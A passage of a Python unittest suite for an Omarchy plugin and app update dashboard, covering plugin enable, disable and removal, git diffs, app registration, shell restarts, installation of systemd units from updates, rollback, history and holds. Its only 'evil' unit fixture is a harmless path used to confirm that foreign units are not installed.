        # binding reads) kept showing the pre-toggle value until the next
        # periodic check or a manual Refresh -- confirmed live, 2026-09-16
        # (Touchpad Glance disabled correctly but the panel still showed it on).
        with patch.object(dash, 'run', return_value=(0, 'Enabled.', '')) as run_mock, \
             patch.object(dash, 'check_all') as check_mock, patch('builtins.print'):
            args = type('A', (), {'id': 'sslvpn'})()
            dash.cmd_enable(args)
        run_mock.assert_called_once_with(['omarchy', 'plugin', 'enable', 'sslvpn'])
        check_mock.assert_called_once()


class CmdDisableTests(unittest.TestCase):
    def test_refuses_to_disable_self(self):
        with patch.object(dash, 'run') as run_mock, patch.object(dash, 'check_all') as check_mock, \
             patch('builtins.print') as print_mock:
            args = type('A', (), {'id': dash.SELF_ID})()
            dash.cmd_disable(args)
        run_mock.assert_not_called()
        check_mock.assert_not_called()
        payload = json.loads(print_mock.call_args.args[0])
        self.assertFalse(payload['ok'])

    def test_disables_other_plugins_normally_and_refreshes_status(self):
        with patch.object(dash, 'run', return_value=(0, 'Disabled.', '')) as run_mock, \
             patch.object(dash, 'check_all') as check_mock, patch('builtins.print'):
            args = type('A', (), {'id': 'sslvpn'})()
            dash.cmd_disable(args)
        run_mock.assert_called_once_with(['omarchy', 'plugin', 'disable', 'sslvpn'])
        check_mock.assert_called_once()


class CmdRemoveTests(unittest.TestCase):
    def test_refuses_to_remove_self(self):
        with patch.object(dash, 'run') as run_mock, patch.object(dash, 'check_all'), patch('builtins.print') as print_mock:
            args = type('A', (), {'id': dash.SELF_ID})()
            dash.cmd_remove(args)
        run_mock.assert_not_called()
        payload = json.loads(print_mock.call_args.args[0])
        self.assertFalse(payload['ok'])

    def test_removes_other_plugins_via_omarchy_cli(self):
        with patch.object(dash, 'run', return_value=(0, 'Removed sslvpn.', '')) as run_mock, \
             patch.object(dash, 'check_all'), patch('builtins.print'):
            args = type('A', (), {'id': 'sslvpn'})()
            dash.cmd_remove(args)
        run_mock.assert_called_once_with(['omarchy', 'plugin', 'remove', 'sslvpn', '--yes'], timeout=60)


class CmdDiffTests(unittest.TestCase):
    def test_plugin_diff_uses_head_and_fetch_head(self):
        with patch.object(dash, 'ensure_apps_file'), patch.object(dash, 'load_apps', return_value=[]), \
             patch.object(dash, 'run', return_value=(0, 'diff --git a b\n', '')) as run_mock, \
             patch('builtins.print') as print_mock:
            dash.PLUGINS_DIR = Path('/home/x/.config/omarchy/plugins')
            args = type('A', (), {'id': 'sslvpn'})()
            dash.cmd_diff(args)
        self.assertIn(call(['git', '-C', '/home/x/.config/omarchy/plugins/sslvpn', 'diff', 'HEAD', 'FETCH_HEAD'], timeout=20),
                      run_mock.call_args_list)
        payload = json.loads(print_mock.call_args.args[0])
        self.assertTrue(payload['ok'])
        self.assertIn('diff --git', payload['diff'])

    def _app_diff(self, branch_has_upstream):
        repo = '/home/x/Projects/howdy'
        table = {
            ('git', '-C', repo, 'merge-base', '--is-ancestor'): (0 if branch_has_upstream else 1, '', ''),
            ('git', '-C', repo, 'diff'): (0, 'diff --git a b\n', ''),
            ('git', '-C', repo, 'log'): (0, '', ''),
        }
        calls = []
        def recording(args, **kw):
            calls.append(args)
            return fake_run(table)(args, **kw)
        with patch.object(dash, 'ensure_apps_file'), patch.object(dash, 'load_apps', return_value=[
                 {'id': 'howdy', 'repoDir': repo, 'branch': 'master', 'remote': 'origin'}]), \
             patch.object(dash, 'run', recording), patch('builtins.print'):
            dash.cmd_diff(type('A', (), {'id': 'howdy'})())
        return [c for c in calls if c[3] == 'diff'][0]

    def test_app_diff_shows_upstreams_side_from_branch(self):
        # Three dots: only what upstream changed, not howdy master's own rebuild.sh commit
        # shown as if upstream were deleting it.
        self.assertEqual(self._app_diff(branch_has_upstream=False),
                         ['git', '-C', '/home/x/Projects/howdy', 'diff', 'master...origin/master'])

    def test_app_diff_uses_head_when_only_the_checked_out_branch_lacks_upstream(self):
        # Flea after an aborted merge: master already has origin/master, aarch64-local does
        # not. app_update_state calls that 'behind'; diffing master showed nothing.
        self.assertEqual(self._app_diff(branch_has_upstream=True),
                         ['git', '-C', '/home/x/Projects/howdy', 'diff', 'HEAD...origin/master'])

    def test_diff_failure_reports_error_message(self):
        with patch.object(dash, 'ensure_apps_file'), patch.object(dash, 'load_apps', return_value=[]), \
             patch.object(dash, 'run', return_value=(1, '', 'fatal: bad revision')), \
             patch('builtins.print') as print_mock:
            dash.PLUGINS_DIR = Path('/home/x/.config/omarchy/plugins')
            args = type('A', (), {'id': 'sslvpn'})()
            dash.cmd_diff(args)
        payload = json.loads(print_mock.call_args.args[0])
        self.assertFalse(payload['ok'])
        self.assertIn('bad revision', payload['message'])


class AddAndRemoveAppTests(unittest.TestCase):
    def test_add_app_requires_name_id_and_repo_dir(self):
        with patch('builtins.print') as print_mock:
            args = type('A', (), {'json': json.dumps({'name': 'Only Name'})})()
            dash.cmd_add_app(args)
        payload = json.loads(print_mock.call_args.args[0])
        self.assertFalse(payload['ok'])

    def test_add_app_rejects_non_git_repo_dir(self):
        with tempfile.TemporaryDirectory() as d:
            with patch('builtins.print') as print_mock:
                args = type('A', (), {'json': json.dumps({'name': 'X', 'id': 'x', 'repoDir': d})})()
                dash.cmd_add_app(args)
            payload = json.loads(print_mock.call_args.args[0])
            self.assertFalse(payload['ok'])
            self.assertIn('not a git repository', payload['message'])

    def test_add_app_writes_entry_and_defaults_optional_fields(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            saved = {}
            with patch.object(dash, 'ensure_apps_file'), patch.object(dash, 'load_apps', return_value=[]), \
                 patch.object(dash, 'save_apps', side_effect=lambda apps: saved.setdefault('apps', apps)), \
                 patch.object(dash, 'check_all'), patch('builtins.print'):
                args = type('A', (), {'json': json.dumps({'name': 'X', 'id': 'x', 'repoDir': d})})()
                dash.cmd_add_app(args)
            self.assertEqual(len(saved['apps']), 1)
            entry = saved['apps'][0]
            self.assertEqual(entry['id'], 'x')
            self.assertEqual(entry['pkgName'], 'x')
            self.assertEqual(entry['branch'], 'master')
            self.assertEqual(entry['remote'], 'origin')
            self.assertEqual(entry['updateCmd'], ['./rebuild.sh', '--install'])

    def test_add_app_splits_string_update_cmd(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            saved = {}
            with patch.object(dash, 'ensure_apps_file'), patch.object(dash, 'load_apps', return_value=[]), \
                 patch.object(dash, 'save_apps', side_effect=lambda apps: saved.setdefault('apps', apps)), \
                 patch.object(dash, 'check_all'), patch('builtins.print'):
                args = type('A', (), {'json': json.dumps({'name': 'X', 'id': 'x', 'repoDir': d, 'updateCmd': './go.sh --now'})})()
                dash.cmd_add_app(args)
            self.assertEqual(saved['apps'][0]['updateCmd'], ['./go.sh', '--now'])

    def test_add_app_replaces_existing_entry_with_same_id(self):
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / '.git').mkdir()
            saved = {}
            with patch.object(dash, 'ensure_apps_file'), \
                 patch.object(dash, 'load_apps', return_value=[{'id': 'x', 'name': 'Old'}]), \
                 patch.object(dash, 'save_apps', side_effect=lambda apps: saved.setdefault('apps', apps)), \
                 patch.object(dash, 'check_all'), patch('builtins.print'):
                args = type('A', (), {'json': json.dumps({'name': 'New', 'id': 'x', 'repoDir': d})})()
                dash.cmd_add_app(args)
            self.assertEqual(len(saved['apps']), 1)
            self.assertEqual(saved['apps'][0]['name'], 'New')

    def test_remove_app_drops_matching_id(self):
        saved = {}
        with patch.object(dash, 'ensure_apps_file'), \
             patch.object(dash, 'load_apps', return_value=[{'id': 'flea'}, {'id': 'howdy'}]), \
             patch.object(dash, 'save_apps', side_effect=lambda apps: saved.setdefault('apps', apps)), \
             patch.object(dash, 'check_all'), patch('builtins.print') as print_mock:
            args = type('A', (), {'id': 'flea'})()
            dash.cmd_remove_app(args)
        self.assertEqual([a['id'] for a in saved['apps']], ['howdy'])
        payload = json.loads(print_mock.call_args.args[0])
        self.assertTrue(payload['ok'])

    def test_remove_app_reports_when_id_not_found(self):
        with patch.object(dash, 'ensure_apps_file'), \
             patch.object(dash, 'load_apps', return_value=[{'id': 'howdy'}]), \
             patch.object(dash, 'save_apps') as save_mock, \
             patch.object(dash, 'check_all'), patch('builtins.print') as print_mock:
            args = type('A', (), {'id': 'nonexistent'})()
            dash.cmd_remove_app(args)
        save_mock.assert_not_called()
        payload = json.loads(print_mock.call_args.args[0])
        self.assertFalse(payload['ok'])


class RestartShellTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)
        for target, value in (('STATE', self.root / 'state'),):
            p = patch.object(dash, target, value)
            p.start()
            self.addCleanup(p.stop)
        p = patch.dict(dash.os.environ, {'XDG_CACHE_HOME': str(self.root / 'cache')})
        p.start()
        self.addCleanup(p.stop)
        self.calls = []

    def _run(self, rc=0, err=''):
        def fake(args, **kw):
            self.calls.append(list(args))
            return (rc, '', err)
        return patch.object(dash, 'run', fake)

    def output(self, now=False):
        buf = __import__('io').StringIO()
        with __import__('contextlib').redirect_stdout(buf):
            dash.cmd_restart_shell(type('A', (), {'now': now})())
        return json.loads(buf.getvalue()) if buf.getvalue() else None

    def test_clears_only_the_compiled_caches_then_restarts(self):
        cache = self.root / 'cache' / 'quickshell'
        for name in ('qmlcache', 'qtpipelinecache-arm64', 'crashes', 'qtshadercache-arm64'):
            (cache / name).mkdir(parents=True)
            (cache / name / 'f').write_text('x')
        with self._run():
            self.assertIsNone(self.output(now=True))
        self.assertEqual(sorted(p.name for p in cache.iterdir()), ['crashes', 'qtshadercache-arm64'])
        self.assertEqual(self.calls, [['omarchy-restart-shell']])

    def test_a_failed_restart_is_a_notification(self):
        with self._run(rc=1, err='Refusing to restart Omarchy shell while the session is locked.\n'):
            self.output(now=True)
        self.assertEqual(self.calls[-1][0], 'notify-send')
        self.assertIn('Refusing to restart Omarchy shell while the session is locked.', self.calls[-1])

    def test_starts_in_its_own_unit(self):
        with self._run():
            r = self.output()
        self.assertTrue(r['ok'])
        self.assertEqual(self.calls[0][:2], ['systemd-run', '--user'])
        self.assertEqual(self.calls[0][-2:], ['restart-shell', '--now'])

    def test_refused_while_a_job_runs(self):
        with patch.object(dash, 'job_active', return_value=True), patch.object(dash, 'reap_stale_job'), self._run():
            r = self.output()
        self.assertFalse(r['ok'])
        self.assertIn('still running', r['message'])
        self.assertEqual(self.calls, [])


if __name__ == '__main__':
    unittest.main()


UNIT = """[Unit]
Description=Recorder
[Service]
ExecStart=/usr/bin/python3 %h/.config/omarchy/plugins/nixfred.pulse/collectors/{name}_pulse.py daemon
[Install]
WantedBy=graphical-session.target
"""


class UnitFixture(unittest.TestCase):
    """A plugin directory and a user-unit directory, both temporary, with `run` recording
    what would have been asked of systemctl instead of asking it."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = Path(self._tmp.name)
        self.plugin = root / 'plugins' / 'nixfred.pulse'
        (self.plugin / 'collectors').mkdir(parents=True)
        (self.plugin / 'manifest.json').write_text('{}')
        self.units = root / 'units'
        self.units.mkdir()
        self.calls = []
        self.systemctl_rc = 0

        def fake(args, cwd=None, timeout=20):
            self.calls.append(list(args))
            return (self.systemctl_rc, '', 'boom' if self.systemctl_rc else '')
        for target, value in (('run', fake), ('USER_UNIT_DIR', self.units), ('UNIT_SETTLE_SECONDS', 0)):
            patcher = patch.object(dash, target, value)
            patcher.start()
            self.addCleanup(patcher.stop)

    def ship(self, name, text=None):
        (self.plugin / 'collectors' / (name + '.service')).write_text(text if text is not None else UNIT.format(name=name))

    def install(self, name, text=None):
        (self.units / (name + '.service')).write_text(text if text is not None else UNIT.format(name=name))


class ShippedUnitsTests(UnitFixture):
    def test_finds_units_at_the_top_and_one_directory_down_and_skips_the_rest(self):
        self.ship('cpu')
        (self.plugin / 'top.timer').write_text('[Timer]')
        for skipped in ('tests', 'docs', '.git'):
            (self.plugin / skipped).mkdir()
            (self.plugin / skipped / 'x.service').write_text('[Service]')
        (self.plugin / 'a' / 'b').mkdir(parents=True)
        (self.plugin / 'a' / 'b' / 'deep.service').write_text('[Service]')
        self.assertEqual(sorted(dash.shipped_units(self.plugin)), ['cpu.service', 'top.timer'])

    def test_a_missing_directory_ships_nothing(self):
        self.assertEqual(dash.shipped_units(self.plugin / 'nope'), {})


class InstallNewUnitsTests(UnitFixture):
    def test_a_unit_added_by_the_update_is_installed_started_and_the_widget_reloaded(self):
        self.ship('cpu'); self.install('cpu-pulse') ; self.ship('cpu-pulse')
        before = dash.shipped_units(self.plugin)
        self.ship('gpu')
        old = (self.plugin / 'manifest.json').stat().st_mtime_ns - 10**9
        import os
        os.utime(self.plugin / 'manifest.json', ns=(old, old))
        messages, ok = dash.install_new_units(self.plugin, before)
        self.assertTrue(ok)
        self.assertEqual((self.units / 'gpu.service').read_text(), UNIT.format(name='gpu'))
        self.assertIn(['systemctl', '--user', 'daemon-reload'], self.calls)
        self.assertIn(['systemctl', '--user', 'enable', '--now', 'gpu.service'], self.calls)
        self.assertTrue(any('Installed and started gpu.service' in m for m in messages), messages)
        self.assertGreater((self.plugin / 'manifest.json').stat().st_mtime_ns, old, 'the widget was made to reload')

    def test_nothing_new_does_nothing(self):
        self.ship('cpu-pulse'); self.install('cpu-pulse')
        messages, ok = dash.install_new_units(self.plugin, dash.shipped_units(self.plugin))
        self.assertEqual((messages, ok, self.calls), ([], True, []))

    def test_a_plugin_whose_services_were_never_installed_is_left_alone(self):
        self.ship('cpu-pulse')
        before = dash.shipped_units(self.plugin)
        self.ship('gpu')
        messages, ok = dash.install_new_units(self.plugin, before)
        self.assertEqual((messages, ok, self.calls), ([], True, []))
        self.assertFalse((self.units / 'gpu.service').exists())

    def test_a_unit_that_was_already_shipped_and_removed_on_purpose_stays_removed(self):
        self.ship('cpu-pulse'); self.install('cpu-pulse'); self.ship('gpu')   # gpu shipped, never installed
        before = dash.shipped_units(self.plugin)
        (self.plugin / 'manifest.json').write_text('{"v":2}')                 # an update that adds no unit
        messages, ok = dash.install_new_units(self.plugin, before)
        self.assertEqual((messages, ok, self.calls), ([], True, []))
        self.assertFalse((self.units / 'gpu.service').exists())

    def test_a_unit_that_does_not_run_this_plugins_code_is_not_installed(self):
        self.ship('cpu-pulse'); self.install('cpu-pulse')
        before = dash.shipped_units(self.plugin)
        self.ship('evil', '[Service]\nExecStart=/usr/bin/somewhere-else\n')
        messages, ok = dash.install_new_units(self.plugin, before)
        self.assertTrue(ok)
        self.assertFalse((self.units / 'evil.service').exists())
        self.assertEqual(self.calls, [])
        self.assertTrue(any('does not run this plugin' in m for m in messages), messages)

    def test_an_existing_unit_file_is_never_overwritten(self):
        self.ship('cpu-pulse'); self.install('cpu-pulse')
        before = dash.shipped_units(self.plugin)
        self.ship('gpu'); self.install('gpu', 'MINE')
        dash.install_new_units(self.plugin, before)
        self.assertEqual((self.units / 'gpu.service').read_text(), 'MINE')

    def test_a_changed_unit_is_reported_and_not_replaced(self):
        self.ship('cpu-pulse'); self.install('cpu-pulse', 'EDITED BY THE USER')
        before = dash.shipped_units(self.plugin)
        self.ship('cpu-pulse', UNIT.format(name='cpu-pulse') + '# new\n')
        messages, ok = dash.install_new_units(self.plugin, before)
        self.assertTrue(ok)
        self.assertEqual((self.units / 'cpu-pulse.service').read_text(), 'EDITED BY THE USER')
        self.assertTrue(any('cpu-pulse.service changed in this update' in m for m in messages), messages)
        self.assertEqual(self.calls, [])

    def test_a_unit_that_changed_but_was_never_installed_is_not_mentioned(self):
        self.ship('cpu-pulse'); self.install('cpu-pulse'); self.ship('gpu')
        before = dash.shipped_units(self.plugin)
        self.ship('gpu', UNIT.format(name='gpu') + '# new\n')
        self.assertEqual(dash.install_new_units(self.plugin, before), ([], True))

    def test_a_service_that_will_not_start_is_a_failure_with_the_reason(self):
        self.ship('cpu-pulse'); self.install('cpu-pulse')
        before = dash.shipped_units(self.plugin)
        self.ship('gpu')
        self.systemctl_rc = 1
        messages, ok = dash.install_new_units(self.plugin, before)
        self.assertFalse(ok)
        self.assertTrue(any('could not start it' in m and 'boom' in m for m in messages), messages)


class CmdUpdateUnitsTests(UnitFixture):
    def setUp(self):
        super().setUp()
        for target, value in (('ensure_apps_file', lambda: None), ('load_apps', lambda: []),
                              ('check_all', lambda: None), ('PLUGINS_DIR', self.plugin.parent)):
            patcher = patch.object(dash, target, value)
            patcher.start()
            self.addCleanup(patcher.stop)
        self.printed = []
        printer = patch('builtins.print', lambda *a, **k: self.printed.append(a[0] if a else ''))
        printer.start()
        self.addCleanup(printer.stop)
        self.ship('cpu-pulse'); self.install('cpu-pulse')
        self.update_rc = 0

        original = dash.run

        def run_with_update(args, cwd=None, timeout=20, **_kwargs):
            if args[:3] == ['omarchy', 'plugin', 'update']:
                self.calls.append(list(args))
                if self.update_rc == 0:
                    self.ship('gpu')                       # what the update brings
                return (self.update_rc, 'Updated.', '' if self.update_rc == 0 else 'merge failed')
            return original(args, cwd=cwd, timeout=timeout)
        patcher = patch.object(dash, 'run', run_with_update)
        patcher.start()
        self.addCleanup(patcher.stop)

    def update(self):
        dash.cmd_update(type('A', (), {'id': 'nixfred.pulse'})())
        return json.loads(self.printed[-1])

    def test_a_unit_the_update_brought_is_installed_and_reported(self):
        result = self.update()
        self.assertTrue(result['ok'], result)
        self.assertIn('Installed and started gpu.service', result['message'])
        self.assertTrue((self.units / 'gpu.service').exists())

    def test_the_before_snapshot_is_taken_before_the_update_runs(self):
        # If it were taken after, the new unit would look as if it had always been there.
        self.assertTrue(self.update()['ok'])
        self.assertLess(self.calls.index(['omarchy', 'plugin', 'update', 'nixfred.pulse', '--yes']),
                        self.calls.index(['systemctl', '--user', 'enable', '--now', 'gpu.service']))
        self.assertTrue((self.units / 'gpu.service').exists())

    def test_a_failed_update_installs_nothing(self):
        self.update_rc = 1
        result = self.update()
        self.assertFalse(result['ok'])
        self.assertFalse((self.units / 'gpu.service').exists())
        self.assertNotIn(['systemctl', '--user', 'daemon-reload'], self.calls)

    def test_a_service_that_will_not_start_makes_the_update_report_failure(self):
        self.systemctl_rc = 1
        result = self.update()
        self.assertFalse(result['ok'])
        self.assertIn('did not come up', result['message'])


class StatusFreshTests(unittest.TestCase):
    def test_missing_ts_is_stale(self):
        self.assertFalse(dash.status_is_fresh({}, now=1000))
        self.assertFalse(dash.status_is_fresh({'ts': 0}, now=1000))
        self.assertFalse(dash.status_is_fresh(None, now=1000))

    def test_younger_than_max_age_is_fresh(self):
        self.assertTrue(dash.status_is_fresh({'ts': 800}, now=1000, max_age=300))

    def test_older_than_max_age_is_stale(self):
        self.assertFalse(dash.status_is_fresh({'ts': 600}, now=1000, max_age=300))


class CmdCheckCacheTests(unittest.TestCase):
    def test_fresh_status_is_returned_without_fetching(self):
        cached = {'ts': time.time(), 'items': [{'id': 'sslvpn', 'updateState': 'up-to-date'}], 'updatable': 0}
        with tempfile.TemporaryDirectory() as d:
            dash.STATE = Path(d)
            dash.STATUS_PATH = Path(d) / 'status.json'
            dash.STATUS_PATH.write_text(json.dumps(cached))
            with patch.object(dash, 'check_all') as check_mock, patch('builtins.print') as print_mock:
                dash.cmd_check(type('A', (), {'force': False})())
        check_mock.assert_not_called()
        payload = json.loads(print_mock.call_args.args[0])
        self.assertEqual(payload['updatable'], 0)
        self.assertEqual(payload['items'][0]['id'], 'sslvpn')

    def test_force_always_fetches(self):
        cached = {'ts': time.time(), 'items': [], 'updatable': 0}
        with tempfile.TemporaryDirectory() as d:
            dash.STATE = Path(d)
            dash.STATUS_PATH = Path(d) / 'status.json'
            dash.STATUS_PATH.write_text(json.dumps(cached))
            with patch.object(dash, 'check_all', return_value={'ts': 1, 'items': [], 'updatable': 0}) as check_mock, \
                 patch.object(dash, 'ensure_apps_file'), patch('builtins.print'):
                dash.cmd_check(type('A', (), {'force': True})())
        check_mock.assert_called_once()

    def test_stale_status_fetches(self):
        cached = {'ts': time.time() - 9999, 'items': [], 'updatable': 0}
        with tempfile.TemporaryDirectory() as d:
            dash.STATE = Path(d)
            dash.STATUS_PATH = Path(d) / 'status.json'
            dash.STATUS_PATH.write_text(json.dumps(cached))
            with patch.object(dash, 'check_all', return_value={'ts': 1, 'items': [], 'updatable': 0}) as check_mock, \
                 patch.object(dash, 'ensure_apps_file'), patch('builtins.print'):
                dash.cmd_check(type('A', (), {'force': False})())
        check_mock.assert_called_once()


def git(repo, *args):
    import subprocess
    return subprocess.run(['git', '-C', str(repo), *args], check=True, capture_output=True, text=True).stdout.strip()


class RealRepoFixture(unittest.TestCase):
    """A real plugin git repo with two commits, so reset/rev-parse/log run for real; only
    omarchy, systemctl and the shell rescan are faked (and recorded)."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        root = Path(self._tmp.name)
        self.plugins = root / 'plugins'
        self.plugin = self.plugins / 'x.plugin'
        self.plugin.mkdir(parents=True)
        self.units = root / 'units'
        self.units.mkdir()
        git(self.plugin, 'init', '-q')
        git(self.plugin, 'config', 'user.email', 't@t'); git(self.plugin, 'config', 'user.name', 't')
        (self.plugin / 'manifest.json').write_text('{"version": "1.0.0"}')
        git(self.plugin, 'add', '.'); git(self.plugin, 'commit', '-qm', 'one')
        self.old = git(self.plugin, 'rev-parse', 'HEAD')
        (self.plugin / 'manifest.json').write_text('{"version": "1.1.0"}')
        (self.plugin / 'gpu.service').write_text('[Service]\nExecStart=/p/x.plugin/run\n')
        git(self.plugin, 'add', '.'); git(self.plugin, 'commit', '-qm', 'two')
        self.new = git(self.plugin, 'rev-parse', 'HEAD')
        (self.units / 'gpu.service').write_text('[Service]\n')
        self.calls = []
        self.validate_rc = 0
        real_run = dash.run

        def fake(args, cwd=None, timeout=20, **kw):
            if args[0] == 'git':
                return real_run(args, cwd=cwd, timeout=timeout)
            self.calls.append(list(args))
            if args[:3] == ['omarchy', 'plugin', 'validate']:
                return (self.validate_rc, '', 'invalid manifest' if self.validate_rc else '')
            return (0, '', '')
        self.printed = []
        state = root / 'state'
        for target, value in (('run', fake), ('PLUGINS_DIR', self.plugins), ('USER_UNIT_DIR', self.units),
                              ('STATE', state), ('STATUS_PATH', state / 'status.json'),
                              ('APPS_PATH', state / 'apps.json'), ('load_apps', lambda: []),
                              ('ensure_apps_file', lambda: None), ('discover_plugins', lambda: [])):
            patcher = patch.object(dash, target, value)
            patcher.start()
            self.addCleanup(patcher.stop)
        printer = patch('builtins.print', lambda *a, **k: self.printed.append(json.loads(a[0])))
        printer.start()
        self.addCleanup(printer.stop)

    def record_update(self, **over):
        entry = {'ts': time.time(), 'id': 'x.plugin', 'name': 'x.plugin', 'kind': 'plugin', 'action': 'update',
                 'ok': True, 'before': self.old, 'after': self.new, 'fromVersion': '1.0.0', 'toVersion': '1.1.0',
                 'unitsInstalled': ['gpu.service'], 'message': ''}
        entry.update(over)
        dash.append_history(entry)

    def rollback(self):
        dash.cmd_rollback(type('A', (), {'id': 'x.plugin'})())
        return self.printed[-1]


class RollbackCandidateTests(RealRepoFixture):
    def test_last_update_at_current_head_is_a_candidate(self):
        self.record_update()
        self.assertEqual(dash.rollback_candidate('x.plugin', dash.load_history())['before'], self.old)

    def test_too_old_is_not(self):
        self.record_update(ts=time.time() - dash.ROLLBACK_WINDOW_SECONDS - 60)
        self.assertIsNone(dash.rollback_candidate('x.plugin', dash.load_history()))

    def test_head_moved_since_is_not(self):
        self.record_update(after='0' * 40)
        self.assertIsNone(dash.rollback_candidate('x.plugin', dash.load_history()))

    def test_after_a_rollback_is_not(self):
        self.record_update()
        self.record_update(action='rollback', before=self.new, after=self.new)
        self.assertIsNone(dash.rollback_candidate('x.plugin', dash.load_history()))

    def test_a_later_failed_update_does_not_hide_the_earlier_one(self):
        # omarchy plugin update puts HEAD back on failure, so it changed nothing.
        self.record_update()
        self.record_update(ok=False, before=self.new, after=self.new)
        self.assertIsNotNone(dash.rollback_candidate('x.plugin', dash.load_history()))

    def test_an_update_that_moved_nothing_is_not(self):
        self.record_update(before=self.new)
        self.assertIsNone(dash.rollback_candidate('x.plugin', dash.load_history()))


class CmdRollbackTests(RealRepoFixture):
    def test_rolls_back_removes_the_added_unit_rescans_and_holds(self):
        self.record_update()
        result = self.rollback()
        self.assertTrue(result['ok'], result)
        self.assertEqual(git(self.plugin, 'rev-parse', 'HEAD'), self.old)
        self.assertFalse((self.units / 'gpu.service').exists())
        self.assertIn(['systemctl', '--user', 'disable', '--now', 'gpu.service'], self.calls)
        self.assertIn(['omarchy-shell', 'shell', 'rescanPlugins'], self.calls)
        self.assertEqual(dash.load_holds()['x.plugin']['reason'], 'rolled back from v1.1.0')
        last = dash.load_history()[-1]
        self.assertEqual((last['action'], last['ok'], last['toVersion']), ('rollback', True, '1.0.0'))
        # and it cannot be rolled back again
        self.assertIsNone(dash.rollback_candidate('x.plugin', dash.load_history()))

    def test_a_unit_the_old_version_also_ships_is_kept(self):
        self.record_update(unitsInstalled=['manifest.json'])  # stands in for a unit present in both
        (self.units / 'manifest.json').write_text('x')
        with patch.object(dash, 'shipped_units', return_value={'manifest.json': (None, '')}):
            self.assertTrue(self.rollback()['ok'])
        self.assertTrue((self.units / 'manifest.json').exists())

    def test_local_edits_ride_along_the_rollback(self):
        (self.plugin / 'notes.txt').write_text('a\nb\nc\nd\ne\n')
        git(self.plugin, 'add', '.'); git(self.plugin, 'commit', '-qm', 'three')
        before = git(self.plugin, 'rev-parse', 'HEAD')
        (self.plugin / 'notes.txt').write_text('A\nb\nc\nd\ne\n')
        git(self.plugin, 'add', '.'); git(self.plugin, 'commit', '-qm', 'four')
        self.record_update(before=before, after=git(self.plugin, 'rev-parse', 'HEAD'))
        (self.plugin / 'notes.txt').write_text('A\nb\nc\nd\nE\n')  # the edit, away from the update's line
        result = self.rollback()
        self.assertTrue(result['ok'], result)
        self.assertEqual(git(self.plugin, 'rev-parse', 'HEAD'), before)
        self.assertEqual((self.plugin / 'notes.txt').read_text(), 'a\nb\nc\nd\nE\n')
        self.assertEqual(git(self.plugin, 'stash', 'list'), '')

    def test_local_edits_that_do_not_fit_the_old_version_keep_the_update(self):
        self.record_update()
        (self.plugin / 'gpu.service').write_text('[Service]\nExecStart=/edited\n')  # file the old version lacks
        result = self.rollback()
        self.assertFalse(result['ok'])
        self.assertIn('left on the update', result['message'])
        self.assertEqual(git(self.plugin, 'rev-parse', 'HEAD'), self.new)
        self.assertIn('/edited', (self.plugin / 'gpu.service').read_text())
        self.assertEqual(git(self.plugin, 'stash', 'list'), '')

    def test_old_version_failing_validation_puts_the_update_back(self):
        self.record_update()
        self.validate_rc = 1
        result = self.rollback()
        self.assertFalse(result['ok'])
        self.assertIn('invalid manifest', result['message'])
        self.assertEqual(git(self.plugin, 'rev-parse', 'HEAD'), self.new)
        self.assertNotIn('x.plugin', dash.load_holds())

    def test_nothing_to_roll_back(self):
        result = self.rollback()
        self.assertFalse(result['ok'])
        self.assertIn('Nothing to roll back', result['message'])

    def test_apps_are_refused(self):
        with patch.object(dash, 'load_apps', lambda: [{'id': 'x.plugin', 'repoDir': '/x'}]):
            self.assertIn('for plugins', self.rollback()['message'])


class UpdateHistoryTests(RealRepoFixture):
    def test_a_plugin_update_records_heads_versions_and_the_units_it_started(self):
        git(self.plugin, 'reset', '-q', '--hard', self.old)
        (self.units / 'gpu.service').unlink()
        (self.units / 'other.service').write_text('x')
        # Shipped AND installed before the update: not something this update started.
        (self.plugin / 'cpu.service').write_text('[Service]\n'); (self.units / 'cpu.service').write_text('x')
        real = dash.run
        plugin, units, new = self.plugin, self.units, self.new

        def updating(args, **kw):
            if args[:3] == ['omarchy', 'plugin', 'update']:
                git(plugin, 'reset', '-q', '--hard', new)
                (units / 'gpu.service').write_text('x')   # what install_new_units would do
                return (0, 'Updated.', '')
            return real(args, **kw)
        with patch.object(dash, 'run', updating), patch.object(dash, 'install_new_units', return_value=([], True)):
            dash.cmd_update(type('A', (), {'id': 'x.plugin'})())
        e = dash.load_history()[-1]
        self.assertEqual((e['before'], e['after'], e['fromVersion'], e['toVersion']), (self.old, self.new, '1.0.0', '1.1.0'))
        self.assertEqual(e['unitsInstalled'], ['gpu.service'])
        self.assertTrue(e['ok'])

    def test_a_failed_update_is_recorded_with_its_last_line(self):
        real = dash.run

        def failing(args, **kw):
            if args[:3] == ['omarchy', 'plugin', 'update']:
                return (1, '', 'fetch failed\ncannot fast-forward')
            return real(args, **kw)
        with patch.object(dash, 'run', failing):
            dash.cmd_update(type('A', (), {'id': 'x.plugin'})())
        e = dash.load_history()[-1]
        self.assertFalse(e['ok'])
        self.assertEqual(e['message'], 'cannot fast-forward')

    def test_history_is_capped(self):
        for i in range(dash.HISTORY_LIMIT + 5):
            dash.append_history({'id': str(i)})
        h = dash.load_history()
        self.assertEqual(len(h), dash.HISTORY_LIMIT)
        self.assertEqual(h[-1]['id'], str(dash.HISTORY_LIMIT + 4))


class HoldTests(RealRepoFixture):
    def test_hold_and_unhold(self):
        dash.cmd_hold(type('A', (), {'id': 'x.plugin', 'reason': ''})())
        self.assertTrue(self.printed[-1]['ok'])
        self.assertIn('x.plugin', dash.load_holds())
        dash.cmd_unhold(type('A', (), {'id': 'x.plugin'})())
        self.assertTrue(self.printed[-1]['ok'])
        self.assertNotIn('x.plugin', dash.load_holds())

    def test_unknown_id_is_refused(self):
        dash.cmd_hold(type('A', (), {'id': 'nope', 'reason': ''})())
        self.assertFalse(self.printed[-1]['ok'])
        self.assertEqual(dash.load_holds(), {})

    def test_held_items_leave_the_count_and_notifications_and_carry_rollback(self):
        self.record_update()
        dash.save_holds({'other': {'ts': 0, 'reason': 'waiting on upstream'}})
        items = [{'id': 'x.plugin', 'kind': 'plugin', 'name': 'X', 'updateState': 'up-to-date'},
